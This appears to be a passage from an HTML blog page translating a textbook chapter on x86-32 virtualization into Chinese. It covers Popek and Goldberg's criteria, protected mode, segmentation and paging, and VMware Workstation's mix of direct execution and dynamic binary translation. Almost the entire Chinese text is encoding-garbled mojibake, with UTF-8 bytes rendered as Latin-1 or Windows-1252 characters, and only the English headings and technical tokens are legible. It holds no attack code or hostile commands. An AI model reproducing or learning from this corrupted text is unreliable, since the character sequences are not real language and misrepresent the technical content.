ã€‚ç„¶è€Œï¼Œè¿‡å»å¯¹äºä»»ä½•éœ€è¦äº†è§£æˆ‘ä»¬æ˜¯å¦‚ä½•èµ°åˆ°ä»Šå¤©çš„æƒ…å†µçš„è®¡ç®—æœºç§‘å­¦å®¶ä»¥åŠå¯¹æ—©æœŸå¼€å‘çš„å…·ä½“æŠ€æœ¯æ„Ÿå…´è¶£çš„äººä»ç„¶å…·æœ‰é‡è¦æ„ä¹‰ã€‚</p><p>å®é™…ä¸Šï¼Œå…ˆå‰å¼€å‘çš„è®¸å¤šè½¯ä»¶æŠ€æœ¯åœ¨è™šæ‹ŸåŒ–ä¹‹å¤–ä¹Ÿæœ‰åº”ç”¨ã€‚æ­¤å¤–ï¼Œé˜…è¯»æœ¬ç« çš„è®¡ç®—æœºæ¶æ„å¸ˆå°†å¯¹åœ¨å¼•å…¥è™šæ‹ŸåŒ–ç¡¬ä»¶æ”¯æŒä¹‹å‰å’Œä¹‹åæ‰€åšçš„æ¶æ„å†³ç­–çš„æ„å¤–åæœæœ‰æ‰€äº†è§£ã€‚ä¾‹å¦‚ï¼ŒVMwareå’ŒXenéƒ½ä¾èµ–äº32ä½æ¶æ„ä¸Šçš„åˆ†æ®µæ¥è¿›è¡Œä¿æŠ¤ï¼Œæ­£å¦‚æœ¬ç« æ‰€è¿°ã€‚éšç€åœ¨x86-64ä¸Šå¼•å…¥VT-xï¼Œåˆ†æ®µä¸å†éœ€è¦æ„å»ºè™šæ‹Ÿæœºç›‘è§†å™¨ï¼Œå› æ­¤åˆ†æ®µè¢«ç§»é™¤ã€‚ç„¶è€Œï¼Œåˆ†æ®µè¿˜æœ‰å…¶ä»–åº”ç”¨ï¼Œä¾‹å¦‚ä¸ºè½»é‡çº§è™šæ‹Ÿæœºæä¾›ä¿æŠ¤ï¼Œå¦‚VX32 [71]å’Œæœ€åˆçš„GoogleåŸç”Ÿå®¢æˆ·ç«¯[190]ã€‚</p><p>MIPSã€x86-32å’ŒARMçš„Popekå’ŒGoldbergå®šç†çš„è¿è§„è¡Œä¸ºåœ¨Â§2.5ä¸­å·²ç»æè¿°è¿‡ã€‚ç”±äºè¿™äº›è¿è§„è¡Œä¸ºçš„ç›´æ¥åæœï¼Œæ²¡æœ‰ä»»ä½•è™šæ‹Ÿæœºç›‘è§†å™¨â€”â€”è‡³å°‘æ²¡æœ‰ä½¿ç”¨Popekå’ŒGoldbergæ‰€é¢„æœŸçš„é™·é˜±å’Œæ¨¡æ‹Ÿä¸ç›´æ¥æ‰§è¡Œç›¸ç»“åˆçš„æŠ€æœ¯æ„å»ºçš„è™šæ‹Ÿæœºç›‘è§†å™¨â€”â€”èƒ½å¤ŸåŒæ—¶æ»¡è¶³ç­‰æ•ˆæ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½è¦æ±‚ã€‚</p><p>æœ¬ç« æè¿°äº†ä¸‰ä¸ªç³»ç»Ÿâ€”â€”Discoã€VMware Workstationå’ŒXenâ€”â€”å®ƒä»¬åˆ†åˆ«ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯æˆ–åšå‡ºä¸åŒçš„æƒè¡¡æ¥è§£å†³å®šç†çš„é™åˆ¶ã€‚è¡¨3.1æä¾›äº†æœ¬ç« å…¶ä½™éƒ¨åˆ†çš„å¯¼èˆªã€‚æ¯ä¸ªéƒ¨åˆ†éƒ½ä½œä¸ºä¸€ä¸ªæ¡ˆä¾‹ç ”ç©¶ï¼Œä»‹ç»äº†ç‰¹å®šè™šæ‹Ÿæœºç›‘è§†å™¨çš„æ˜¾è‘—ç‰¹ç‚¹ï¼Œè¿™äº›éƒ¨åˆ†æŒ‰ç…§å¼•å…¥æ¯ä¸ªç³»ç»Ÿçš„æ—¶é—´é¡ºåºæ’åºã€‚</p><h2 id="VMWARE-WORKSTATIONâ€”FULL-VIRTUALIZATION-ON-X86-32"><a href="#VMWARE-WORKSTATIONâ€”FULL-VIRTUALIZATION-ON-X86-32" class="headerlink" title="VMWARE WORKSTATIONâ€”FULL VIRTUALIZATION   ON X86-32"></a>VMWARE WORKSTATIONâ€”FULL VIRTUALIZATION   ON X86-32</h2><p>VMware Workstation 1.0äº1999å¹´å‘å¸ƒï¼Œæ˜¯32ä½x86æ¶æ„çš„ç¬¬ä¸€ä¸ªè™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆVMMï¼‰[45, 46, 65, 162]ã€‚ä½œä¸ºä¸€æ¬¾å•†ä¸šäº§å“ï¼ŒVMwareçš„æ„¿æ™¯æ˜¯åˆ›å»ºä¸€ä¸ªåœ¨ç”±x86-32 CPUæ„å»ºçš„é€šç”¨å¹³å°ä¸Šæœ‰ç”¨çš„è™šæ‹ŸåŒ–å±‚ï¼Œå¹¶ä¸»è¦è¿è¡ŒMicrosoft Windowsæ“ä½œç³»ç»Ÿï¼ˆå³WinTelå¹³å°ï¼‰ã€‚è™šæ‹ŸåŒ–çš„å¥½å¤„å¯ä»¥å¸®åŠ©è§£å†³WinTelå¹³å°å·²çŸ¥çš„ä¸€äº›é™åˆ¶ï¼Œå¦‚åº”ç”¨ç¨‹åºäº’æ“ä½œæ€§ã€æ“ä½œç³»ç»Ÿè¿ç§»ã€å¯é æ€§å’Œå®‰å…¨æ€§ã€‚æ­¤å¤–ï¼Œè™šæ‹ŸåŒ–è¿˜å¯ä»¥è½»æ¾å®ç°æ“ä½œç³»ç»Ÿæ›¿ä»£æ–¹æ¡ˆçš„å…±å­˜ï¼Œç‰¹åˆ«æ˜¯Linuxã€‚</p><p>ç”±äºå…¶ä¸“æ³¨äºå•†ä¸šå°é—­æºæ“ä½œç³»ç»Ÿï¼Œx86è®¡ç®—ç¯å¢ƒä¸è™šæ‹ŸåŒ–éœ€è¦é‡‡ç”¨æ–°çš„æ–¹æ³•ï¼Œå› ä¸ºä¸åƒä»¥å‰çš„Discoæˆ–ç¨åçš„Xené‚£æ ·é‡æ–°ç¼–è¯‘å†…æ ¸æ˜¯ä¸€ä¸ªé€‰é¡¹ã€‚æ­¤å¤–ï¼Œx86è¡Œä¸šå…·æœ‰åˆ†æ•£çš„ç»“æ„ã€‚ä¸åŒçš„å…¬å¸ç‹¬ç«‹å¼€å‘x86å¤„ç†å™¨ã€è®¡ç®—æœºã€æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºã€‚ç„¶åï¼Œç³»ç»Ÿé›†æˆå•†å°†è¿™äº›ç»„ä»¶ç»„åˆæˆä¸€ä¸ªæ”¯æŒçš„â€œå¼€ç®±å³ç”¨â€è§£å†³æ–¹æ¡ˆã€‚å¯¹äºx86å¹³å°ï¼Œè™šæ‹ŸåŒ–éœ€è¦åœ¨ä¸æ”¹å˜å¹³å°çš„ç°æœ‰ç¡¬ä»¶æˆ–ç°æœ‰è½¯ä»¶çš„æƒ…å†µä¸‹æ’å…¥ã€‚å› æ­¤ï¼ŒVMware Workstationçš„æ¶æ„å¦‚ä¸‹ï¼š</p><ul><li>ä½œä¸ºçº¯è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆï¼Œä¸ç°æœ‰æœªä¿®æ”¹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿå…¼å®¹ï¼›</li><li>ä½œä¸ºç°æœ‰Linuxå’ŒWindowsä¸»æœºæ“ä½œç³»ç»Ÿçš„Type-2è™šæ‹Ÿæœºç›‘è§†å™¨ã€‚</li></ul><p>VMware Workstationå°†Popekå’ŒGoldbergçš„è™šæ‹Ÿæœºçš„ä¸‰ä¸ªæ ¸å¿ƒå±æ€§é€‚åº”åˆ°åŸºäºx86çš„ç›®æ ‡å¹³å°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><ol><li><strong>ç­‰ä»·æ€§ï¼ˆEquivalenceï¼‰ï¼š</strong>æ­£å¦‚åœ¨Â§2.5.2ä¸­è®¨è®ºçš„ï¼Œx86-32æ¶æ„å…·æœ‰17ä¸ªè™šæ‹ŸåŒ–æ•æ„Ÿçš„éç‰¹æƒæŒ‡ä»¤ï¼Œè¿™è¿åäº†Popekå’ŒGolbergå…³äºä¸¥æ ¼è™šæ‹ŸåŒ–çš„æ ‡å‡†[151]ã€‚è¿™æ’é™¤äº†ä¼ ç»Ÿçš„é™·é˜±å’Œæ¨¡æ‹Ÿè™šæ‹ŸåŒ–æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œè‹±ç‰¹å°”å…¬å¸çš„å·¥ç¨‹å¸ˆæ›¾åšä¿¡ä»–ä»¬çš„å¤„ç†å™¨æ— æ³•ä»¥ä»»ä½•å®é™…æ„ä¹‰çš„æ–¹å¼è¿›è¡Œè™šæ‹ŸåŒ–[74]ã€‚VMwareçš„è§£å†³æ–¹æ¡ˆç»“åˆäº†ç›´æ¥æ‰§è¡Œï¼ˆåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯ç”¨äºè¿è¡Œåº”ç”¨ç¨‹åºï¼‰å’ŒåŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘ï¼ˆåœ¨éœ€è¦æ—¶ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡Œå®¢æˆ·æ“ä½œç³»ç»Ÿæ—¶ï¼‰ã€‚åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘æ˜¯ä¸€ç§é«˜æ•ˆçš„ä»¿çœŸå½¢å¼ï¼›å‚è§Â§3.2.2ã€‚</li><li><strong>å®‰å…¨æ€§ï¼ˆSafetyï¼‰ï¼š</strong>è™šæ‹Ÿæœºç›‘è§†å™¨å¿…é¡»ä¿è¯è™šæ‹Ÿæœºçš„éš”ç¦»ï¼Œè€Œä¸ä¼šå¯¹å†…éƒ¨è¿è¡Œçš„è½¯ä»¶åšä»»ä½•å‡è®¾ã€‚VMware Workstationé…ç½®äº†ç¡¬ä»¶ï¼Œç‰¹åˆ«æ˜¯å¹¿æ³›ä½¿ç”¨åˆ†æ®µæˆªæ–­æ¥éš”ç¦»è™šæ‹Ÿæœºï¼ˆå‚è§Â§3.2.3ï¼‰ã€‚ä¸ºäº†ç®€åŒ–æµ‹è¯•å¹¶å‡å°‘åœ¨æœªç»æµ‹è¯•çš„ä»£ç è·¯å¾„ä¸­å¼•å…¥å®‰å…¨æ¼æ´çš„å¯èƒ½æ€§ï¼ŒVMware Workstationä»…æ”¯æŒx86-32æ¶æ„çš„å­é›†ï¼Œä»¥è¿è¡ŒæŸäº›æŒ‡å®šçš„æ”¯æŒå®¢æˆ·æ“ä½œç³»ç»Ÿã€‚ä»»ä½•ä¸å—æ”¯æŒçš„è¯·æ±‚ï¼Œä¾‹å¦‚å°è¯•åœ¨%cplÂ¹=1æˆ–%cpl=2å¤„æ‰§è¡Œä»£ç ï¼Œè¿™åœ¨ä»»ä½•æ”¯æŒçš„å®¢æˆ·æ“ä½œç³»ç»Ÿä¸­éƒ½ä¸ä¼šå‘ç”Ÿï¼Œå°†ç®€å•åœ°ä¸­æ­¢æ‰§è¡Œã€‚</li><li><strong>æ€§èƒ½ï¼ˆPerformanceï¼‰ï¼š</strong>ä½œä¸ºè®¾è®¡ç›®æ ‡ï¼ŒVMwareçš„ç›®æ ‡æ˜¯ä»¥æ¥è¿‘æœ¬æœºé€Ÿåº¦è¿è¡Œç›¸å…³å·¥ä½œè´Ÿè½½ï¼Œè€Œåœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œå°†å®ƒä»¬è¿è¡Œåœ¨å½“æ—¶çš„å¤„ç†å™¨ä¸Šï¼Œæ€§èƒ½ä¸åœ¨ä¸å…·å¤‡è™šæ‹ŸåŒ–åŠŸèƒ½çš„å‰ä¸€ä»£å¤„ç†å™¨ä¸Šè¿è¡Œæ—¶ç›¸åŒã€‚è¿™æ ·çš„æ€§èƒ½æ°´å¹³å°†å…è®¸ç”¨æˆ·æœ‰æ•ˆåœ°ä½¿ç”¨è™šæ‹Ÿæœºï¼Œå°±åƒä½¿ç”¨çœŸå®æœºå™¨ä¸€æ ·ã€‚è¿™åŸºäºè¿™æ ·ä¸€ä¸ªè§‚å¯Ÿï¼Œå³å¤§å¤šæ•°x86è½¯ä»¶å¹¶ä¸æ˜¯è®¾è®¡ä»…åœ¨æœ€æ–°ä¸€ä»£CPUä¸Šè¿è¡Œçš„ã€‚</li></ol><p>ä¸ºäº†å®ç°è¿™æ ·çš„æ€§èƒ½ç›®æ ‡ï¼Œå°½ç®¡å…¶ä¸ºType-2æ¶æ„ä¸”å­˜åœ¨ä¸»æœºæ“ä½œç³»ç»Ÿï¼ŒVMware Workstationåœ¨æ‰§è¡ŒæœŸé—´éœ€è¦å¯¹ç¡¬ä»¶è¿›è¡Œå®Œå…¨æ§åˆ¶ã€‚Â§3.2.3æè¿°äº†å¦‚ä½•é…ç½®æ®µè¡¨å’ŒCPUä»¥å‡å°‘åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘çš„å¼€é”€ã€‚Â§3.2.4æè¿°äº†Type-2è™šæ‹Ÿæœºç›‘è§†å™¨çš„æ¨¡å—åŒ–è®¾è®¡ï¼Œåˆ†ä¸ºä¸‰ä¸ªä¸åŒçš„ç»„ä»¶ï¼šä¸»æœºæ“ä½œç³»ç»Ÿçš„ç”¨æˆ·çº§è¿›ç¨‹ã€ä¸»æœºæ“ä½œç³»ç»Ÿå†…çš„å†…æ ¸æ¨¡å—ä»¥åŠåœ¨ç¡¬ä»¶çš„å®Œå…¨æ§åˆ¶ä¸‹è¿è¡Œçš„VMware VMMã€‚è¿™æ˜¯é€šè¿‡world switchå®ç°çš„ï¼Œå®ƒåœ¨ä¸ä¸»æœºæ“ä½œç³»ç»Ÿçš„å…±ä½æƒ…å†µä¸‹èµ‹äºˆäº†VMware VMMå¯¹ç¡¬ä»¶çš„å®Œå…¨æ§åˆ¶æƒã€‚æœ€åï¼ŒÂ§3.2.5æè¿°äº†å½±å­åˆ†é¡µï¼Œå…è®¸è™šæ‹Ÿæœºï¼ˆåŒ…æ‹¬å®¢æˆ·æ“ä½œç³»ç»Ÿï¼‰ç›´æ¥ä½¿ç”¨åº•å±‚ç¡¬ä»¶çš„å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰ã€‚</p><h3 id="3-2-1-X86-32-FUNDAMENTALS"><a href="#3-2-1-X86-32-FUNDAMENTALS" class="headerlink" title="3.2.1 X86-32 FUNDAMENTALS"></a>3.2.1 X86-32 FUNDAMENTALS</h3><p>åœ¨æ·±å…¥è®¨è®ºVMwareå¦‚ä½•è™šæ‹ŸåŒ–x86-32æ¶æ„ä¹‹å‰ï¼Œè®©æˆ‘ä»¬ç®€è¦ä»‹ç»è¯¥æ¶æ„çš„å…³é”®æ–¹é¢ï¼š</p><ol><li><strong>æ‰§è¡Œæ¨¡å¼ï¼š</strong><ul><li>x86-32æ¶æ„å…·æœ‰ä¸€ç§æœ¬æœºæ‰§è¡Œæ¨¡å¼ï¼Œç§°ä¸ºâ€œä¿æŠ¤æ¨¡å¼â€ï¼Œæ˜¯ç°ä»£æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„ä¸»è¦è¿è¡Œæ¨¡å¼ã€‚</li><li>æ­¤å¤–ï¼Œå®ƒåŒ…æ‹¬ä¸‰ç§éæœ¬æœºæ¨¡å¼ï¼šå®æ¨¡å¼ã€ç³»ç»Ÿç®¡ç†æ¨¡å¼å’Œv8086æ¨¡å¼ï¼Œæ¯ç§æ¨¡å¼å…·æœ‰ç‰¹å®šçš„ç”¨é€”ã€‚</li><li>åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œå½“å‰ç‰¹æƒçº§åˆ«ï¼ˆcplï¼‰ç”¨äºåŒºåˆ†å†…æ ¸æ‰§è¡Œï¼ˆ%cpl=0ï¼‰å’Œç”¨æˆ·çº§æ‰§è¡Œï¼ˆ%cpl&gt;0ï¼‰ã€‚ç†è®ºä¸Šæœ‰å››ä¸ªç‰¹æƒçº§åˆ«ï¼Œä½†åœ¨å®é™…ä¸­ï¼Œç”¨æˆ·çº§ä»£ç é€šå¸¸åœ¨%cpl=3ä¸‹è¿è¡Œï¼Œä¸­é—´ç‰¹æƒçº§åˆ«ä¸è¢«ä½¿ç”¨ã€‚</li></ul></li><li><strong>I/Oç‰¹æƒçº§åˆ«ï¼ˆIOPLï¼‰ï¼š</strong><ul><li>è¯¥æ¶æ„å¼•å…¥äº†I/Oç‰¹æƒçº§åˆ«ï¼ˆioplï¼‰ï¼Œå…è®¸ç”¨æˆ·çº§ä»£ç å¯ç”¨æˆ–ç¦ç”¨ä¸­æ–­ï¼Œæä¾›äº†æ§åˆ¶ä¸åŒç‰¹æƒçº§åˆ«ä¸­æ–­å¤„ç†çš„æœºåˆ¶ã€‚</li></ul></li><li><strong>å†…å­˜ç®¡ç†ï¼š</strong><ul><li>x86-32æ¶æ„é‡‡ç”¨åˆ†æ®µå’Œåˆ†é¡µä¸¤ç§å†…å­˜ç®¡ç†æœºåˆ¶ã€‚</li><li>åˆ†æ®µç”±å…­ä¸ªæ®µå¯„å­˜å™¨ç®¡ç†ï¼Œå¦‚ä»£ç æ®µï¼ˆ%csï¼‰ã€å †æ ˆæ®µï¼ˆ%ssï¼‰ã€æ•°æ®æ®µï¼ˆ%dsï¼‰ä»¥åŠé¢å¤–çš„æ®µå¯„å­˜å™¨ï¼ˆ%esã€%fsã€%gsï¼‰ã€‚æ¯ä¸ªæ®µé€šè¿‡åŸºåœ°å€å’Œé™åˆ¶å®šä¹‰äº†32ä½çº¿æ€§åœ°å€çš„ä¸€éƒ¨åˆ†ã€‚</li><li>åˆ†é¡µç”¨äºå°†çº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚è¯¥æ¶æ„è§„å®šäº†ä¸€ä¸ªä»¥ç‰¹æƒçº§å¯„å­˜å™¨%cr3ä¸ºæ ¹çš„ä¸‰çº§é¡µè¡¨ç»“æ„ã€‚</li><li>å½“å‘ç”ŸTLBï¼ˆç¿»è¯‘é«˜é€Ÿç¼“å†²ï¼‰æœªå‘½ä¸­æ—¶ï¼Œå¤„ç†å™¨ç›´æ¥éå†é¡µè¡¨ç»“æ„å¹¶å°†æ˜ å°„æ’å…¥TLBï¼Œæ— éœ€è½¯ä»¶å¹²é¢„ã€‚</li></ul></li></ol><p>äº†è§£x86-32æ¶æ„çš„è¿™äº›åŸºæœ¬æ–¹é¢å¯¹äºç†è§£VMwareå¦‚ä½•é’ˆå¯¹è¯¥å¹³å°è¿›è¡Œè™šæ‹ŸåŒ–è‡³å…³é‡è¦ã€‚</p><h3 id="3-2-2è™šæ‹ŸåŒ–-X86-32-CPU"><a href="#3-2-2è™šæ‹ŸåŒ–-X86-32-CPU" class="headerlink" title="3.2.2è™šæ‹ŸåŒ– X86-32 CPU"></a>3.2.2è™šæ‹ŸåŒ– X86-32 CPU</h3><p>ä¸ºäº†è™šæ‹Ÿå¯è™šæ‹ŸåŒ–çš„ä½“ç³»ç»“æ„è€Œæ„å»ºçš„è™šæ‹Ÿæœºç›‘æ§ç¨‹åºï¼ˆVMMï¼‰é‡‡ç”¨äº†ç”±Popekå’ŒGoldbergæè¿°çš„é™·é˜±å’Œä»¿çœŸæ–¹æ³•ã€‚è¿™ç§æŠ€æœ¯ä¹Ÿè¢«ç§°ä¸ºç›´æ¥æ‰§è¡Œï¼ˆDEï¼‰ï¼Œå› ä¸ºè™šæ‹ŸæœºæŒ‡ä»¤ç›´æ¥åœ¨å¤„ç†å™¨ä¸Šæ‰§è¡Œã€‚ç„¶è€Œï¼Œç”±äºå…¶è®¾è®¡ç›®æ ‡æ˜¯åœ¨ä¸å¯è™šæ‹ŸåŒ–çš„ä½“ç³»ç»“æ„ä¸Šè¿è¡Œæœªç»ä¿®æ”¹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿï¼Œå•ç‹¬çš„ç›´æ¥æ‰§è¡Œå¹¶ä¸æ˜¯ä¸€ç§ç­–ç•¥ã€‚</p><p>å¦ä¸€ç§é€‰æ‹©æ˜¯é‡‡ç”¨å…¨ä»¿çœŸæ–¹æ³•ã€‚é€šè¿‡SimOS [153]æœºå™¨æ¨¡æ‹Ÿå™¨çš„ç»éªŒè¡¨æ˜ï¼Œä½¿ç”¨è¯¸å¦‚åœ¨ç”¨æˆ·çº§ç¨‹åºä¸­è¿è¡Œçš„åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘ï¼ˆDBTï¼‰ç­‰æŠ€æœ¯ï¼Œå¯ä»¥å°†å®Œå…¨ä»¿çœŸçš„å¼€é”€é™åˆ¶åœ¨5å€çš„å‡é€Ÿã€‚è™½ç„¶å¯¹äºæœºå™¨æ¨¡æ‹Ÿç¯å¢ƒæ¥è¯´é€Ÿåº¦å¾ˆå¿«ï¼Œä½†æ˜¾ç„¶ä¸è¶³ä»¥æ»¡è¶³æˆ‘ä»¬çš„æ€§èƒ½è¦æ±‚ã€‚</p><p>VMwareè§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•ç»“åˆäº†ä¸¤ä¸ªå…³é”®è§è§£ã€‚é¦–å…ˆï¼Œè™½ç„¶ç›´æ¥æ‰§è¡Œæ— æ³•ç”¨äºè™šæ‹ŸåŒ–æ•´ä¸ªx86ä½“ç³»ç»“æ„ï¼Œä½†å®ƒå®é™…ä¸Šå¯ä»¥åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨ï¼Œç‰¹åˆ«æ˜¯ç”¨äºè¿è¡Œåº”ç”¨ç¨‹åºã€‚ç¬¬äºŒä¸ªå…³é”®è§è§£æ˜¯é€šè¿‡æ­£ç¡®é…ç½®ç¡¬ä»¶ï¼Œç‰¹åˆ«æ˜¯é€šè¿‡è°¨æ…ä½¿ç”¨x86åˆ†æ®µä¿æŠ¤æœºåˆ¶ï¼Œå¯ä»¥ä½¿åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘ä¸‹çš„ç³»ç»Ÿä»£ç ä¹Ÿèƒ½ä»¥æ¥è¿‘æœ¬æœºé€Ÿåº¦è¿è¡Œï¼›è¿™å°†åœ¨Â§3.2.3ä¸‹é¢è®¨è®ºã€‚</p><p><img src="https://img.gls.show/img/20230904124838.png"></p><p>å›¾3.1æ˜¾ç¤ºäº†åŠ¨æ€ç¡®å®šæ˜¯å¦å¯ä»¥ä½¿ç”¨ç›´æ¥æ‰§è¡Œè¿˜æ˜¯å¿…é¡»ä½¿ç”¨åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘çš„å®é™…ç®—æ³•ã€‚è¯¥ç®—æ³•ä¾èµ–äºè™šæ‹Ÿæœºçš„ä¸€äº›ç‰¹å®šå¯„å­˜å™¨çš„çŠ¶æ€ï¼Œå¹¶å¯¼è‡´ä»¥ä¸‹å†³ç­–ï¼š</p><ul><li>ï¼ˆè¡Œï¼ƒ1-ï¼ƒ3ï¼‰ï¼šåªæœ‰åœ¨ä¿æŠ¤æ¨¡å¼å’Œv8086æ¨¡å¼ä¸‹æ‰ä¼šè®¾ç½®ï¼…cr0.peã€‚å½“è™šæ‹Ÿæœºå¤„äºå®æ¨¡å¼æˆ–ç³»ç»Ÿç®¡ç†æ¨¡å¼æ—¶ï¼Œéœ€è¦ä½¿ç”¨DBTã€‚ä¾‹å¦‚ï¼ŒBIOSåœ¨å®æ¨¡å¼ä¸‹è¿è¡Œï¼›</li><li>ï¼ˆè¡Œï¼ƒ4-ï¼ƒ6ï¼‰ï¼šx86 v8086æ¨¡å¼å§‹ç»ˆå¯ä»¥ç›´æ¥ä½¿ç”¨DEæ¥è™šæ‹ŸåŒ–v8086æ¨¡å¼ä¸‹çš„å®¢æˆ·ï¼Œä¾‹å¦‚ï¼Œåœ¨Windows 95ä¸­è¿è¡ŒMS-DOSä»¿çœŸ [111]ï¼›</li><li>ï¼ˆè¡Œï¼ƒ7-ï¼ƒ9ï¼‰ï¼šæ¯å½“è™šæ‹Ÿæœºå¯ä»¥æ§åˆ¶ä¸­æ–­æ ‡å¿—æ—¶ï¼Œéƒ½éœ€è¦ä½¿ç”¨DBTã€‚è¿™ä¸ªå¹¶é›†åŒ…æ‹¬äº†å½“å®¢æˆ·åœ¨å†…æ ¸æ¨¡å¼æ‰§è¡Œï¼ˆcpl=0ï¼‰æ—¶çš„å¸¸è§æƒ…å†µï¼Œä½†ä¹ŸåŒ…æ‹¬äº†ç”¨æˆ·çº§è¿›ç¨‹å¯ä»¥é€šè¿‡ç¦ç”¨ä¸­æ–­æ¥å»ºç«‹å…³é”®åŒºåŸŸçš„ç½•è§æƒ…å†µï¼ˆä¾‹å¦‚ï¼Œåœ¨Linuxä¸Šä½¿ç”¨iopl(2)ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼›</li><li>ï¼ˆè¡Œï¼ƒ10-14ï¼‰ï¼šæ¯å½“æ— æ³•ä»å†…å­˜ä¸­æ¢å¤å…­ä¸ªæ®µæè¿°ç¬¦å¯„å­˜å™¨ä¸­çš„ä»»ä½•ä¸€ä¸ªçš„éšè—å†…å®¹æ—¶ï¼Œéƒ½éœ€è¦ä½¿ç”¨DBTã€‚è¿™æ˜¯ä¸€ä¸ªæœ‰ç‚¹éšæ™¦çš„è¾¹ç¼˜æƒ…å†µï¼Œå¿…é¡»å¤„ç†æ‰èƒ½æ­£ç¡®è¿è¡ŒWindows 95ï¼›</li><li>åœ¨å…¶ä½™æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨DEï¼Œç‰¹åˆ«æ˜¯åœ¨æ— æ³•ç¦ç”¨ä¸­æ–­æ—¶å¯ä»¥åœ¨ç”¨æˆ·çº§åˆ«ä½¿ç”¨ã€‚</li></ul><p>å¦‚æœæˆ‘ä»¬æ’é™¤è¿™äº›è¾¹ç¼˜æƒ…å†µï¼Œç®—æ³•ä½¿VMware VMMä½¿ç”¨DBTæ¥æ‰§è¡Œå®¢æˆ·æ“ä½œç³»ç»Ÿï¼Œä½¿ç”¨DEæ¥è¿è¡Œåº”ç”¨ç¨‹åºã€‚è¿™æ˜¯ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œå› ä¸ºå†…æ ¸ä»£ç çš„æ•°é‡æ˜¯æœ‰é™çš„ï¼Œå¹¶ä¸”å¤§å¤šæ•°åº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·çº§åˆ«èŠ±è´¹äº†å¤§éƒ¨åˆ†æ‰§è¡Œæ—¶é—´ã€‚</p><p>è¿™ä¸ªç®—æ³•æœ‰ä¸¤ä¸ªæœ‰è¶£çš„ç‰¹æ€§ï¼šï¼ˆiï¼‰å®ƒä¸å¯¹æœªæ¥å¯èƒ½æ‰§è¡Œçš„å®¢æˆ·æŒ‡ä»¤åšä»»ä½•å‡è®¾ï¼Œè€Œæ˜¯ä»¥O.1/çš„é€Ÿåº¦æ‰§è¡Œï¼›ï¼ˆiiï¼‰é€šè¿‡è°¨æ…ç¼–ç è™šæ‹Ÿå¤„ç†å™¨çŠ¶æ€ï¼Œå¯ä»¥ç”¨å°‘æ•°æ±‡ç¼–æŒ‡ä»¤æ¥å®ç°ã€‚</p><p>æ­£å¼è€ƒè™‘ï¼šPopekå’ŒGoldbergåœ¨ä»–ä»¬çš„æ··åˆè™šæ‹Ÿæœºä¸­è®¨è®ºäº†ç±»ä¼¼çš„æƒ…å†µï¼ˆå‚è§Â§2.3å’Œç¬¬3å®šç†[143]ï¼‰ï¼Œé€‚ç”¨äºæ‰€æœ‰ç”¨æˆ·æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒçš„ä½“ç³»ç»“æ„ã€‚x86-32ä½“ç³»ç»“æ„å‡ ä¹å±äºè¿™ä¸€ç±»åˆ«ï¼šsgdtã€sidtã€sldtå’Œsmswæ˜¯å”¯ä¸€çš„éç‰¹æƒã€ç”¨æˆ·æ•æ„ŸæŒ‡ä»¤ã€‚å¹¸è¿çš„æ˜¯ï¼Œå³ä½¿æ˜¯Intelçš„æ‰‹å†Œä¹Ÿå°†å®ƒä»¬æè¿°ä¸ºå¯ç”¨ä½†å¯¹åº”ç”¨ç¨‹åºæ²¡æœ‰ç”¨å¤„ [102]ã€‚æ­¤å¤–ï¼Œç”¨äºéš”ç¦»VMware VMMçš„æ®µæˆªæ–­é€šè¿‡lslæŒ‡ä»¤å¯è§äºåº”ç”¨ç¨‹åºã€‚VMware Workstationä½¿ç”¨ç›´æ¥æ‰§è¡Œè¿åäº†ç­‰æ•ˆæ€§è¦æ±‚ï¼Œä½†é™¤äº†æä¾›ä¸€ç§ç¡®å®šåº”ç”¨ç¨‹åºæ˜¯å¦åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¿è¡Œçš„ç®€ä¾¿æ–¹æ³•å¤–ï¼Œå‡ ä¹æ²¡æœ‰å®é™…åæœã€‚</p><h3 id="3-2-3-VMWare-VMM-åŠå…¶äºŒè¿›åˆ¶ç¿»è¯‘å™¨"><a href="#3-2-3-VMWare-VMM-åŠå…¶äºŒè¿›åˆ¶ç¿»è¯‘å™¨" class="headerlink" title="3.2.3 VMWare VMM åŠå…¶äºŒè¿›åˆ¶ç¿»è¯‘å™¨"></a>3.2.3 VMWare VMM åŠå…¶äºŒè¿›åˆ¶ç¿»è¯‘å™¨</h3><blockquote><p>VMware 